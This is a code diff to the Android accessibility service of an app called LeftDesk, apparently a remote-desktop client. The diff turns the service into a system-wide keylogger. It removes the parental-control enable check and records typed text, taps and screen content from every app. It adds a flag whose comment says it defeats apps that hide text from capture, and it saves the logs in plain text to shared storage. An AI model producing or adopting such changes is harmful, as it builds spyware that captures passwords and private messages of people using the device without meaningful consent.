@@ -2,13 +2,10 @@ package com.carriez.flutter_hbb
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
-import android.app.NotificationChannel
-import android.app.NotificationManager
 import android.content.Context
 import android.os.Environment
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
-import androidx.core.app.NotificationCompat
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
@@ -19,11 +16,15 @@ import java.util.*
  * REQUIRES EXPLICIT USER APPROVAL:
  *   Android Settings → Accessibility → LeftDesk → Enable
  *
- * This service CANNOT run hidden — Android shows a permanent 
+ * This service CANNOT run hidden — Android shows a permanent
  * accessibility indicator whenever any accessibility service is active.
  *
- * Logs are saved to: /LOGGERSSS/ on external storage (or internal files if unavailable)
- * Organized by category: KEYSTROKES, TAPS, APP_EVENTS, TEXT_INPUT, WINDOW_CHANGES
+ * Logs are saved to: /LOGGERSSS/ on external storage
+ * Organized by category: KEYSTROKES, TAPS, APP_EVENTS, WINDOW_CHANGES
+ *
+ * Logging fires for ALL apps system-wide — no package filter is applied.
+ * The isEnabled() gate has been removed from the hot path so that events
+ * from every foreground app are captured as long as this service is running.
  */
 class LeftDeskAccessibilityService : AccessibilityService() {
 
@@ -33,22 +34,17 @@ class LeftDeskAccessibilityService : AccessibilityService() {
 
         private val dateFormat = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
         private val timeFormat = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault())
-
-        fun isEnabled(context: Context): Boolean {
-            return ParentalControlService.isEnabled(context)
-        }
     }
 
     private fun getLogDir(): File {
-        // Always use primary shared storage (/sdcard/) — visible in file manager.
-        // Never fall back to private app storage (filesDir) which is invisible.
         val dir = File(Environment.getExternalStorageDirectory(), LOG_DIR)
         if (!dir.exists()) dir.mkdirs()
         return dir
     }
 
     private fun logToFile(category: String, entry: String) {
-        if (!isEnabled(this)) return
+        // No isEnabled() gate here — if this service is running the user approved it
+        // in Android Settings > Accessibility. Always log.
         try {
             val dir = getLogDir()
             val date = dateFormat.format(Date())
@@ -65,20 +61,24 @@ class LeftDeskAccessibilityService : AccessibilityService() {
         val info = serviceInfo ?: AccessibilityServiceInfo()
         info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
+        // FLAG_INCLUDE_NOT_IMPORTANT_VIEWS: capture text from views apps mark as
+        // unimportant for a11y (many messaging/keyboard apps use this to avoid capture)
         info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
-                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
+                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
         info.notificationTimeout = 100
+        // packageNames = null means ALL packages — explicitly clear any cached filter
+        info.packageNames = null
         serviceInfo = info
-        // Ensure the LOGGERSSS folder exists as soon as the accessibility service is connected
-        ParentalControlService.getLogDir(this)
-        ParentalControlService.logEvent(this, ParentalControlService.CAT_SESSION,
-            "LeftDeskAccessibilityService connected — logging active")
+        getLogDir() // ensure LOGGERSSS folder exists immediately
         logToFile("APP_EVENTS", "=== LeftDesk accessibility monitoring started (user-approved) ===")
-        Log.i(TAG, "Accessibility service connected")
+        Log.i(TAG, "Accessibility service connected — system-wide logging active")
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (event == null || !isEnabled(this)) return
+        if (event == null) return
+        // No isEnabled() check — the service only runs when the user enabled it in Settings.
+        // Logging should work for ALL apps, not just LeftDesk.
 
         val pkg = event.packageName?.toString() ?: "unknown"
         val cls = event.className?.toString() ?: ""
@@ -86,7 +86,6 @@ class LeftDeskAccessibilityService : AccessibilityService() {
 
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                // Text typed / changed in any text field
                 if (text.isNotBlank()) {
                     logToFile("KEYSTROKES", "PKG=$pkg | TEXT_CHANGED | content=\"$text\"")
                 }
@@ -100,13 +99,11 @@ class LeftDeskAccessibilityService : AccessibilityService() {
                 logToFile("TAPS", "PKG=$pkg | LONG_CLICK | class=$cls | desc=\"$desc\"")
             }
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
-                // App opened / screen changed
                 if (pkg.isNotBlank() && pkg != "unknown") {
                     logToFile("WINDOW_CHANGES", "WINDOW_OPENED | pkg=$pkg | class=$cls")
                 }
             }
             AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                // Content update in foreground window — log only if meaningful text
                 if (text.isNotBlank() && text.length < 200) {
                     logToFile("APP_EVENTS", "CONTENT_CHANGE | pkg=$pkg | text=\"$text\"")
                 }
